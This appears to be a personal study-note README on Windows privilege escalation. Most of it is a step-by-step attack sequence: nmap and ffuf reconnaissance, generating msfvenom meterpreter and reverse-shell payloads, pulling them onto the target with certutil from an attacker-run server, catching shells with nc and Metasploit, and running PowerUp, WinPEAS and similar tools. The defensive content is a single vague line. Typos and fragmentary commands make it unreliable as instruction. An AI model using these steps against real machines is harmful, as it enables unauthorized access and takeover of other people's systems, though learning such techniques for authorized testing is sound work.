# winescalation
Windows Privilege Escalation


Intro:
A cyberattack technique for Gaining unauthorized access to your windows and gaining more control or higher privileges than what is typically allowed. It is possible due to weakness or vulnerability in the system.


Example - Login to website with someone's account


AIM:
->Gain administrative control
->Access restricted resources
->Maintain persistence
->Expand lateral movement
->Evade detection and security measures


2 types:


1.Horizontal priv escalation - When 1st users got access to other account via any username or password or via any other method and login or work as 2nd user.


2.Vertical priv escalation - When user able to perform any activity on behalf of administrator.

I) Gaining Initial Access 


->It basically requires some type of privilages in your hand.


->Once we have initial access we can then perform enumeration to identify vulnerabilities that can allow us to do privilage escalation.


nmap -p- -A ipofdevice -oN nmap.txt --min-rate 10000


If FTP anonumous service is allowed
If no file found or not found anything , try to put some file from your system
put nmap.txt

Now if found port 80 
just type ip on the browser 
use ffuf => ffuf -u http://ip/FUZZ/nmap.txt -w /usr/share/seclists/Discovery/web-content/reft-small-directoriex.txt -t 100

Now try uploading payload created by msfvenom

msfvenom -l formats , 
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=yourip lport=80,443,53,445(prefer or 80) -f aspx -o robensive.aspx , 


or (2nd method) , 
msfvenom -p windows/x64/shell_reverse_tcp lhost= lport=8989,7777 -f exe -o test.exe 


now upload robensive.aspx or test.exe ,
For uploading (for 2nd method),
python3 -m http-server 8000(for running a server from the linux terminal),
certutil -urlcache -f -split http:://lhost:8000/test.exe test.exe(On target windows command prompt),
nc -lnvp 8989 (on termainal),
test.exe


run metasploit listener(for 1st method)


msfdb run ,
uer exploit/multi/handler ,
set payload windows/x64/meterpreter/reverse_tcp ,
set lhost=yourip , 
set lport=445(as used before),
run

Now access robensive.aspx via browser and get meterpreter
##Completer Initiall Access##

getuid ,
getprivs ,
sc qc unquotedsvc => cd BINARY_PATH_NAME" ,
cmdkey /list


Enumeration for privsec 
->some known scripts:
PowerUp , 
WinPEAS , 
PrivescCheck , 
BeRoot , 
PayloadAllThings ,
->Now we can try poetential ways to privilage escalation over the system to be a administrative user
->Many automation scripts


Practical part:
shell , 
net localgroup administrators -> got  all users , 
net user "username" , 
exit

1.Powerup (google it):
wget from github , 
load , 
load powershell , 
help , 
powershell_import PowerUp.ps1 , 
powershell_execurte Invoke_powerup(can cause problem to use  for powerups 


2.Privescheck(google it):
powershell_import PrivescCheck.ps1 , 
powershell_execurte Invoke_PrivescCheck

3.WinPeas(install from github):
upload winpeasx64.exe(on meterpreter) , 
shell , 
winpeasx64.exe


4.Beroot(install from github ):
upload beRoot.exe , 
shell ,
beroot.exe


#Priviege Escalataion
->Based on enumeration we will exploit the machine.

Mitigation:
Based on vulnearabilities , different mitigation should be applied
